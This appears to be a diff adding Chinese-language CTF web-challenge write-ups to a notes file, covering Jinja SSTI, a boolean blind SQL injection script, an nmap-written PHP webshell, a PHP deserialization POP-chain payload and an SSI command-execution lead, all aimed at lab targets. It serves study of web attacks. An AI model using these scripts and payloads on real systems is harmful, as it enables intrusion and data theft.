@@ -4458,3 +4458,386 @@ payload：
 
 这道题简单，只需要只要序列化就可以了，没有很绕
 
+### [WesternCTF2018]shrine
+
+~~~php
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+app.config['FLAG'] = os.environ.pop('FLAG')
+
+
+@app.route('/')
+def index():
+    return open(__file__).read()
+
+
+@app.route('/shrine/<path:shrine>')
+def shrine(shrine):
+
+    def safe_jinja(s):
+        s = s.replace('(', '').replace(')', '')
+        blacklist = ['config', 'self']
+        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
+
+    return flask.render_template_string(safe_jinja(shrine))
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+~~~
+
+考察的是SSTI模板注入
+
+![image-20210602123836022](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210602123836022.png)
+
+
+
+![image-20210602124418330](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210602124418330.png)
+
+[WP | 大专栏 (dazhuanlan.com)](https://www.dazhuanlan.com/2019/12/19/5dfaeb8cf31c7/)
+
+[(6条消息) 【攻防世界】十七 --- shrine_通地塔的博客-CSDN博客](https://blog.csdn.net/qq_43168364/article/details/111873910)
+
+### [极客大挑战 2019]FinalSQL
+
+![image-20210602130328557](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210602130328557.png)
+
+空格、mid()、or、and被过滤
+
+本题使用SQL盲注，数字型注入
+
+布尔盲注脚本：
+
+~~~python
+import sys
+import time
+
+import requests
+
+def getPayload(result_index, char_index, ascii):
+    # 附加url
+    start_str = "0^"
+    end_str = ""
+    # 自定义SQL查询语句
+    # select_str="version()" #limit "+ str(result_index) + ",1" 显示数据库、版本、用户名
+    # 查询所有数据库名
+    # select_str="select(group_concat(schema_name))from(information_schema.schemata)"#limit "+ str(result_index) + ",1"
+    # 查询特定数据库中的所有表名
+    # select_str="select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')"# limit "+str(result_index)+",1"
+    # 查询数据库的表的列名
+    # select_str= "select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')"# limit " + str(result_index) + ",1"
+    # 查询特定数据库特定表中内容
+    select_str="select(SUBSTRING((group_concat(password)),160))from(F1naI1y)"#limit "+str(result_index)+",1"
+    # 连接payload
+    sqli_str = "(ascii(substr((" + select_str + ")," + str(char_index) + ",1))>" + str(ascii) + ")"
+    payload = start_str + sqli_str + end_str
+    # print(payload)
+    return payload
+# F1naI1y:id,username,password,Flaaaaag:id,fl4gawsl
+
+def execute(result_index, char_index, ascii):
+    # 连接url
+    url = "http://29c27056-5dc3-4352-9dac-d3687158ca20.node3.buuoj.cn//search.php?id="
+    exec_url = url + getPayload(result_index, char_index, ascii)
+    # print(exec_url)
+    # 检查回显
+    echo = "NO! Not this! Click others"
+    content = requests.get(exec_url).text
+    time.sleep(0.2)
+    if echo in content:
+        return True
+    else:
+        return False
+
+
+def dichotomy(result_index, char_index, left, right):
+    while left < right:
+        # 二分法
+        ascii = int((left + right) / 2)
+        if execute(str(result_index), str(char_index + 1), str(ascii)):
+            left = ascii
+        else:
+            right = ascii
+        # 结束二分
+        if left == right - 1:
+            if execute(str(result_index), str(char_index + 1), str(ascii)):
+                ascii += 1
+                break
+            else:
+                break
+    return chr(ascii)
+
+
+if __name__ == "__main__":
+    for num in range(32):  # 查询结果的数量
+        count = 0
+        for len in range(1000):  # 单条查询结果的长度
+            count += 1
+            char = dichotomy(num, len, 30, 126)
+            if ord(char) == 31:  # 单条查询结果已被遍历
+                break
+            sys.stdout.write(char)
+            sys.stdout.flush()
+        if count == 1:  # 查询结果已被遍历
+            break
+        sys.stdout.write("\r\n")
+        sys.stdout.flush()
+
+~~~
+
+
+
+![image-20210602181913873](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210602181913873.png)
+
+### [网鼎杯 2020 朱雀组]Nmap
+
+![image-20210603111952247](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603111952247.png)
+
+源码注释中给了flag的位置
+
+![image-20210603112058032](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603112058032.png)
+
+nmap有个参数 `-oG`是保存内容到一个文件中的，本题可以使用创建一句话木马，**短标签绕过**
+
+~~~
+<?php
+    echo “1111111111111 <br>”; 
+?>
+ 
+<?
+    echo “222222222222 <br>”;
+?>
+
+
+<%
+     echo“333333333333 <br>”;
+%>
+
+
+(注释：这种写法在php配置中默认关闭了的，所以不能输出一行3.如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags=off ,将off改为on。改动配置文件后需要重启apache。)
+ 
+<script language=”php”>
+     echo“444444444444 <br>”
+</script>
+~~~
+
+
+
+和以前做过的Online Tool题目套路一样
+
+蚁剑连接，找到/flag文件
+
+![image-20210603115418451](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603115418451.png)
+
+### [MRCTF2020]Ezpop---序列化pop链
+
+~~~php
+Welcome to index.php
+<?php
+//flag is in flag.php
+//WTF IS THIS?
+//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
+//And Crack It!
+class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this->append($this->var);
+    }
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file='index.php'){
+        $this->source = $file;
+        echo 'Welcome to '.$this->source."<br>";
+    }
+    public function __toString(){
+        return $this->str->source;
+    }
+
+    public function __wakeup(){
+        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
+            echo "hacker";
+            $this->source = "index.php";
+        }
+    }
+}
+
+class Test{
+    public $p;
+    public function __construct(){
+        $this->p = array();
+    }
+
+    public function __get($key){
+        $function = $this->p;
+        return $function();
+    }
+}
+
+if(isset($_GET['pop'])){
+    @unserialize($_GET['pop']);
+}
+else{
+    $a=new Show;
+    highlight_file(__FILE__);
+} 
+~~~
+
+审计代码，考察的应该是序列化的知识：序列化pop链
+
+> 1. 序列化Pop链，利用几个类之间相互关联进行构造
+> 2. 文件包含漏洞：Modifier类中append函数使用了include（），会出现文件包含漏洞。
+
+魔术方法：
+
+> \_\_construct   当一个对象创建时被调用，
+> \__toString   当一个对象被当作一个字符串被调用。
+> \_\_wakeup()   使用unserialize时触发
+> \_\_get()    用于从不可访问的属性读取数据
+> #难以访问包括：（1）私有属性，（2）没有初始化的属性
+> __invoke()   当脚本尝试将对象调用为函数时触发
+
+https://blog.csdn.net/weixin_43952190/article/details/106016260
+
+payload:
+
+~~~php
+<?php
+class Modifier {
+    protected  $var = 'php://filter/read=convert.base64-encode/resource=flag.php';
+   }
+ class Show{
+    public $source;
+    public $str;
+    public function __toString(){
+        return $this->str->source;
+    }
+ 
+    public function __wakeup(){
+        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
+            echo "hacker";
+            $this->source = "index.php";
+        }
+    }
+}
+ 
+class Test{
+    public $p;
+ 
+}
+ 
+$a = new Show();
+$b = $a->source = new Show(); //调用__toString()方法
+$c = $b->str = new Test();//调用Test类中的__get()方法
+$c->p = new Modifier();//调用Modifier类中的__invoke()方法
+echo urlencode(serialize($a)); //最终$a形成了一条pop序列化链
+~~~
+
+![image-20210603141332169](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603141332169.png)
+
+![image-20210603141342459](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603141342459.png)
+
+### [CISCN2019 华东南赛区]Web11
+
+![image-20210603165844097](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603165844097.png)
+
+发现了本机的ip地址，在数据包中尝试修改了一下XXF头，并不存在SQL注入漏洞，又怀疑存在ssti漏洞，试了一下成功发现SSTI
+
+![image-20210603170045820](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603170045820.png)
+
+![image-20210603170451129](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603170451129.png)
+
+使用system函数查看系统文件，获得了flag
+
+![image-20210603170646413](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603170646413.png)
+
+![image-20210603170717056](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603170717056.png)
+
+本题考察的就是ssti，难度不大
+
+### [BJDCTF2020]EasySearch
+
+![image-20210603172041583](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603172041583.png)
+
+用工具扫描到了备份文件，**注意要用单线程去扫描，多线程没有扫到，可能是因为靶场带宽不够导致的**
+
+以下是备份文件里的内容，是PHP代码，开始代码审计吧
+
+~~~php
+<?php
+	ob_start();
+	function get_hash(){
+		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
+		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
+		$content = uniqid().$random;
+		return sha1($content); 
+	}
+    header("Content-Type: text/html;charset=utf-8");
+	***
+    if(isset($_POST['username']) and $_POST['username'] != '' )
+    {
+        $admin = '6d0bc1';
+        if ( $admin == substr(md5($_POST['password']),0,6)) { //密码的MD5值前六位等于'6d0bc1'
+            echo "<script>alert('[+] Welcome to manage system')</script>";
+            $file_shtml = "public/".get_hash().".shtml";
+            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
+            $text = '
+            ***
+            ***
+            <h1>Hello,'.$_POST['username'].'</h1>
+            ***
+			***';
+            fwrite($shtml,$text);
+            fclose($shtm l);
+            ***
+			echo "[!] Header  error ...";
+        } else {
+            echo "<script>alert('[!] Failed')</script>";
+            
+    }else
+    {
+	***
+    }
+	***
+?>
+~~~
+
+使用python脚本爆破出$admin == substr(md5($_POST['password']),0,6)
+
+~~~python
+import hashlib
+
+for i in range(10000000000):
+    md5 = hashlib.md5(str(i).encode("utf-8")).hexdigest()
+    if(md5[:6] == '6d0bc1'):
+        print(md5[:6])
+        print(i)
+        pass
+~~~
+
+爆破出密码是2020666，发送数据包并发现了一个url
+
+![image-20210603193457031](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603193457031.png)
+
+访问url，返回了用户信息、时间还有ip
+
+![image-20210603193603502](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603193603502.png)
+
+这三个字段信息肯定有可以利用的地方，先试试XFF字段，看看是否有SQL注入或者SSTI，很失望并不存在相关漏洞，看了别人的WP才知道原来是shtml后缀存在`SSI` 远程命令执行漏洞
+
+
+
+![image-20210603195102156](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603195102156.png)
+
+![image-20210603195158456](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210603195158456.png)
+
